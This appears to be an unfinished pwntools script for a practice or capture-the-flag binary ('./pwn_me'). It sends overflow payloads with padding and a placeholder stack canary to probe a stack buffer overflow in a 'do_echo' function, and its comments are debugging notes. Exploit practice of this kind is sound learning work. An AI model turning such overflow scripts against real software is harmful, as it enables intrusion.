from pwn import *

p = process("./pwn_me")

def stack_smashing():
    input()
    # Look at when stack canary is loaded back in
    # b *do_echo+297, then look at RCX 
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    payload += b'C'*8 #This is the canary
    p.sendline(payload)
    print(p.recv())
    # Need to send this second packet to trigger the stack smashing message
    p.sendline(b'X'*8)
    print(p.recv())
    #p.sendline(b'Y'*8)
    #print(p.recv())
    #input()

def exp():
    input()
    print(p.recv())
    payload = b'\xff' +  b'B' * 0x200
    #b *do_echo+127
    #payload += b'B' * 0x200
    # Got the stack overflow finally
    # payload = 
    # first buf: 0x7ffc03cd1708 -> How may bytest to read
    # second buf: 0x7ffc03cd1710
    # Ok, so, why is the (b *do_echo+178) not dropping more bytes in there?
    p.sendline(payload)
    print(p.recv())
    p.sendline(b'hello')
    print(p.recv())

if __name__=='__main__':
    stack_smashing()
